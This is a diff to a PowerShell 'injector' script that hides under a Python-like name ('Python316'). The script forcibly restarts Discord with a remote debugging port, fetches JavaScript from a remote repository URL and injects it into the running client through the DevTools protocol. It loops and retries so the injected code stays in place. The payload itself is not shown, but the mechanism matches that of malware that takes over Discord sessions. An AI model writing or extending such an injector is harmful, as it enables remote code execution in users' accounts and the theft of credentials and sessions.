@@ -2,6 +2,7 @@
 param(
     [int]$Port,
     [string]$Root,
+    [string]$RepoBase,
     [string]$MainUrl,
     [string]$MainPath,
     [switch]$Once,
@@ -13,8 +14,7 @@ param(
 
 $ErrorActionPreference = 'Stop'
 
-# NOTE: $PSScriptRoot is empty inside param defaults when launched with -File,
-# so resolve it in the body instead.
+# $PSScriptRoot is empty inside param defaults when launched with -File.
 if (-not $Root) {
     $Root = if ($PSScriptRoot) { $PSScriptRoot } else { Split-Path -Parent $MyInvocation.MyCommand.Path }
 }
@@ -24,6 +24,7 @@ $StateDir = Join-Path $env:LOCALAPPDATA 'Python316'
 if (-not (Test-Path $StateDir)) { New-Item -ItemType Directory -Path $StateDir -Force | Out-Null }
 $LogFile      = Join-Path $StateDir 'injector.log'
 $RestartStamp = Join-Path $StateDir 'last_restart.txt'
+$StateFile    = Join-Path $StateDir 'last_inject.json'
 
 function Write-Log {
     param([string]$Message, [string]$Level = 'INFO')
@@ -41,15 +42,23 @@ function Write-Log {
 $cfg = [pscustomobject]@{}
 $configPath = Join-Path $Root 'config.json'
 if (Test-Path $configPath) {
-    try { $cfg = Get-Content $configPath -Raw | ConvertFrom-Json } catch { Write-Log "config.json parse failed" 'WARN' }
+    try { $cfg = Get-Content $configPath -Raw | ConvertFrom-Json } catch { Write-Log 'config.json parse failed' 'WARN' }
 }
 if (-not $PSBoundParameters.ContainsKey('Port') -and $cfg.port) { $Port = [int]$cfg.port }
 if (-not $Port) { $Port = 9222 }
 if (-not $MainUrl -and $cfg.githubRaw) { $MainUrl = [string]$cfg.githubRaw }
+if (-not $RepoBase -and $cfg.repoBase) { $RepoBase = [string]$cfg.repoBase }
 if (-not $MainPath) { $MainPath = Join-Path $Root 'main.js' }
 $AutoLaunch      = if ($null -ne $cfg.autoLaunch)      { [bool]$cfg.autoLaunch }      else { $true }
 $RestartExisting = if ($null -ne $cfg.restartExisting) { [bool]$cfg.restartExisting } else { $true }
 $PollSeconds     = if ($cfg.pollSeconds)               { [int]$cfg.pollSeconds }      else { 6 }
+
+function Get-RepoBase {
+    if ($RepoBase) { return $RepoBase.TrimEnd('/') }
+    if ($MainUrl) { return ($MainUrl -replace '/[^/]+$', '').TrimEnd('/') }
+    return $null
+}
+$RepoBase = Get-RepoBase
 
 # ---------------------------------------------------------------- single instance
 $mutex = New-Object System.Threading.Mutex($false, 'Local\Python316Injector')
@@ -77,20 +86,17 @@ function Get-DiscordExe {
 
 function Test-DebugEndpoint {
     try {
-        $t = Invoke-RestMethod -Uri ("http://127.0.0.1:{0}/json" -f $Port) -TimeoutSec 3 -UseBasicParsing
-        return $t
-    } catch {
-        return $null
-    }
+        return (Invoke-RestMethod -Uri ("http://127.0.0.1:{0}/json" -f $Port) -TimeoutSec 3 -UseBasicParsing)
+    } catch { return $null }
 }
 
 function Wait-DebugEndpoint {
-    param([int]$Seconds = 25)
+    param([int]$Seconds = 30)
     $deadline = (Get-Date).AddSeconds($Seconds)
     while ((Get-Date) -lt $deadline) {
         $t = Test-DebugEndpoint
         if ($t) { return $t }
-        Start-Sleep -Milliseconds 800
+        Start-Sleep -Milliseconds 700
     }
     return $null
 }
@@ -162,50 +168,122 @@ function Get-EvalValue {
     } catch { return $null }
 }
 
-function Test-Injected {
+function Get-CurrentVersion {
     try {
-        $r = Invoke-CdpEval -Code "typeof window.__python316 !== 'undefined'"
-        return [bool](Get-EvalValue -Text $r)
-    } catch { return $false }
+        $r = Invoke-CdpEval -Code "try{(window.__python316 && window.__python316.__version) || null}catch(e){null}"
+        return Get-EvalValue -Text $r
+    } catch { return $null }
 }
 
-function Get-MainCode {
-    if (-not $NoDownload -and $MainUrl) {
+function Test-VersionMatch {
+    param($Current, [string]$Desired)
+    if (-not $Desired) { return [bool]$Current }
+    return ([string]$Current -eq [string]$Desired)
+}
+
+function Test-PayloadCode {
+    param([string]$Code)
+    if (-not $Code -or $Code.Length -lt 500) { return $false }
+    if ($Code -notmatch '__python316') { return $false }
+    if ($Code -notmatch 'Python3\.16') { return $false }
+    return $true
+}
+
+function Save-PayloadCache {
+    param([string]$Code)
+    try {
+        $tmp = "$MainPath.tmp"
+        Set-Content -LiteralPath $tmp -Value $Code -Encoding UTF8
+        Move-Item -LiteralPath $tmp -Destination $MainPath -Force
+    } catch { Write-Log "Cache write failed: $($_.Exception.Message)" 'WARN' }
+}
+
+function Get-RemotePayload {
+    # returns @{ Code; Version; Url } or $null
+    if ($NoDownload) { return $null }
+    $url = $MainUrl
+    $version = $null
+
+    if ($RepoBase) {
         try {
-            $sep = if ($MainUrl -match '\?') { '&' } else { '?' }
-            $u = '{0}{1}t={2}' -f $MainUrl, $sep, [DateTime]::UtcNow.Ticks
-            $code = (Invoke-WebRequest -Uri $u -UseBasicParsing -TimeoutSec 20).Content
-            if ($code -and $code.Length -gt 50) {
-                try { Set-Content -LiteralPath $MainPath -Value $code -Encoding UTF8 } catch {}
-                return $code
-            }
+            $vUrl = '{0}/version.json?t={1}' -f $RepoBase, [DateTime]::UtcNow.Ticks
+            $v = Invoke-RestMethod -Uri $vUrl -TimeoutSec 10 -UseBasicParsing
+            if ($v.url) { $url = [string]$v.url }
+            if ($v.version) { $version = [string]$v.version }
         } catch {
-            Write-Log "Download failed: $($_.Exception.Message)" 'WARN'
+            Write-Log "version.json unavailable: $($_.Exception.Message)" 'WARN'
         }
     }
-    if (Test-Path $MainPath) {
-        Write-Log "Using local payload: $MainPath"
-        return (Get-Content -LiteralPath $MainPath -Raw)
+    if (-not $url) { Write-Log 'No payload URL resolved' 'WARN'; return $null }
+
+    try {
+        $sep = if ($url -match '\?') { '&' } else { '?' }
+        $fUrl = '{0}{1}t={2}' -f $url, $sep, [DateTime]::UtcNow.Ticks
+        $code = (Invoke-WebRequest -Uri $fUrl -UseBasicParsing -TimeoutSec 20).Content
+        if (-not (Test-PayloadCode -Code $code)) { throw 'payload failed validation' }
+        if ($version -and $code -match '__version\s*=\s*[''"]([^''"]+)[''"]') {
+            $codeVer = $Matches[1]
+            if ($codeVer -ne $version) { Write-Log "version.json=$version but payload=$codeVer" 'WARN' }
+            $version = $codeVer
+        }
+        Save-PayloadCache -Code $code
+        return [pscustomobject]@{ Code = $code; Version = $version; Url = $url }
+    } catch {
+        Write-Log "Download failed: $($_.Exception.Message)" 'WARN'
+        return $null
     }
-    throw 'No payload available (download failed and no local main.js)'
+}
+
+function Get-LocalPayload {
+    if (-not (Test-Path $MainPath)) { return $null }
+    $code = Get-Content -LiteralPath $MainPath -Raw
+    if (-not (Test-PayloadCode -Code $code)) { return $null }
+    $version = $null
+    if ($code -match '__version\s*=\s*[''"]([^''"]+)[''"]') { $version = $Matches[1] }
+    return [pscustomobject]@{ Code = $code; Version = $version; Url = $MainPath }
+}
+
+function Get-Payload {
+    $p = Get-RemotePayload
+    if ($p) { return $p }
+    $p = Get-LocalPayload
+    if ($p) {
+        Write-Log "Using local payload: $MainPath"
+        return $p
+    }
+    throw 'No payload available (download failed and no valid local main.js)'
 }
 
 function Restart-Discord {
     param([string]$Exe)
     if (-not $Exe) { throw 'Discord executable not found' }
-    Write-Log 'Stopping Discord to relaunch with the debug port'
+    Write-Log 'Restarting Discord to enable the debug port'
     Get-Process -Name Discord -ErrorAction SilentlyContinue | Stop-Process -Force
     Start-Sleep -Seconds 2
     Start-Process -FilePath $Exe -ArgumentList ("--remote-debugging-port={0}" -f $Port) | Out-Null
     Set-Content -LiteralPath $RestartStamp -Value (Get-Date -Format 'o') -Encoding Ascii
 }
 
+function Save-InjectState {
+    param([string]$Version)
+    try {
+        [pscustomobject]@{
+            version = $Version
+            time    = (Get-Date -Format 'o')
+            port    = $Port
+        } | ConvertTo-Json | Set-Content -LiteralPath $StateFile -Encoding UTF8
+    } catch {}
+}
+
+$script:FailBackoff = 0
+$script:LastOkVersion = $null
+
 # ---------------------------------------------------------------- one pass
 function Invoke-Pass {
-    $exe = Get-DiscordExe
-    $procs = Get-Process -Name Discord -ErrorAction SilentlyContinue
+    $proc = Get-Process -Name Discord -ErrorAction SilentlyContinue | Select-Object -First 1
+    $exe = if ($proc -and $proc.Path) { $proc.Path } else { Get-DiscordExe }
 
-    if (-not $procs) {
+    if (-not $proc) {
         if ($NoLaunch -or -not $AutoLaunch) {
             Write-Log 'Discord not running (launch disabled)'
             return
@@ -213,43 +291,64 @@ function Invoke-Pass {
         if (-not $exe) { Write-Log 'Discord not installed' 'WARN'; return }
         Write-Log "Discord not running. Launching with debug port $Port"
         Start-Process -FilePath $exe -ArgumentList ("--remote-debugging-port={0}" -f $Port) | Out-Null
-        Wait-DebugEndpoint -Seconds 25 | Out-Null
+        [void](Wait-DebugEndpoint -Seconds 30)
         return
     }
 
-    $targets = Test-DebugEndpoint
-    if (-not $targets) {
+    if (-not (Test-DebugEndpoint)) {
         if ($NoRestart -or -not $RestartExisting) {
             Write-Log 'Discord is running without the debug port (restart disabled)'
             return
         }
         if (-not (Restart-Allowed)) {
-            Write-Log 'Waiting before another restart attempt'
+            Write-Log 'Waiting before another restart attempt' 'WARN'
             return
         }
         Restart-Discord -Exe $exe
-        Wait-DebugEndpoint -Seconds 25 | Out-Null
+        [void](Wait-DebugEndpoint -Seconds 30)
         return
     }
 
-    if (Test-Injected) { return }
-
     try {
-        $code = Get-MainCode
-        $resp = Invoke-CdpEval -Code $code
-        if (Test-Injected) {
-            Write-Log 'main.js injected successfully' 'OK'
+        $payload = Get-Payload
+        $current = Get-CurrentVersion
+
+        if (Test-VersionMatch -Current $current -Desired $payload.Version) {
+            $v = [string]$current
+            if ($script:LastOkVersion -ne $v) { Write-Log ("Up to date (v{0})" -f $v) 'DEBUG'; $script:LastOkVersion = $v }
+            $script:FailBackoff = 0
+            return
+        }
+
+        if ($RepoBase) {
+            $safeBase = $RepoBase -replace "'", "''"
+            [void](Invoke-CdpEval -Code ("window.__py316Repo = '{0}';" -f $safeBase))
+        }
+
+        [void](Invoke-CdpEval -Code $payload.Code)
+        Start-Sleep -Milliseconds 250
+        $after = Get-CurrentVersion
+
+        if ($after) {
+            $script:FailBackoff = 0
+            $script:LastOkVersion = [string]$after
+            Save-InjectState -Version ([string]$after)
+            if ($payload.Version -and ([string]$after -ne [string]$payload.Version)) {
+                Write-Log ("Injected but version mismatch (current={0} payload={1})" -f $after, $payload.Version) 'WARN'
+            } else {
+                Write-Log ("main.js injected successfully (v{0})" -f $after) 'OK'
+            }
         } else {
-            $v = Get-EvalValue -Text $resp
-            if ($v) { Write-Log "Evaluated: $v" } else { Write-Log 'Injection attempted; marker missing, retrying next poll' 'WARN' }
+            throw 'marker missing after evaluate (page may not be ready)'
         }
     } catch {
-        Write-Log "Injection error: $($_.Exception.Message)" 'ERR'
+        $script:FailBackoff = if ($script:FailBackoff -lt 6) { 6 } else { [Math]::Min(60, $script:FailBackoff * 2) }
+        Write-Log ("Injection error: {0} (backoff {1}s)" -f $_.Exception.Message, $script:FailBackoff) 'ERR'
     }
 }
 
 # ---------------------------------------------------------------- run
-Write-Log "Python316 injector starting (port=$Port root=$Root once=$([bool]$Once))"
+Write-Log ("Python316 injector v2 starting (port={0} root={1} once={2} base={3})" -f $Port, $Root, [bool]$Once, $RepoBase)
 
 try {
     if ($Once) {
@@ -257,11 +356,11 @@ try {
     } else {
         while ($true) {
             try { Invoke-Pass } catch { Write-Log "Pass error: $($_.Exception.Message)" 'ERR' }
-            Start-Sleep -Seconds $PollSeconds
+            $sleep = [Math]::Max($PollSeconds, $script:FailBackoff)
+            Start-Sleep -Seconds $sleep
         }
     }
 } finally {
     try { if ($hasMutex) { $mutex.ReleaseMutex() } } catch {}
     try { $mutex.Dispose() } catch {}
 }
-
